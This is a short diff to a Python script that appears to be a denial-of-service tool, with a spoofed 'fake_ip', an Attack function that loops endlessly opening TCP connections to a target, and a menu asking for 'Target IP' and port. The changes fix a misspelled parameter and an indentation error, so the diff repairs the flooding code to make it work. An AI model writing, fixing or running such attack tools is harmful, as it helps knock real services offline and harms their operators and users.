@@ -8,7 +8,7 @@ import time
 from scapy.all import *
 fake_ip = '44.197.175.168'
 attack_num = 0
-def Attack(target, poirt):
+def Attack(target, port):
 	while True:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((target, port))
@@ -122,7 +122,7 @@ def main():
         print("/_/     /_____/\____/____/  ")
         target = str(input("Target IP: "))
         port = int(input("Target Port (80 suggested): "))
-	Attack(target, port)
+        Attack(target, port)
     elif option == 3:
         os.system("clear")
         print("  ______    ____       _____")
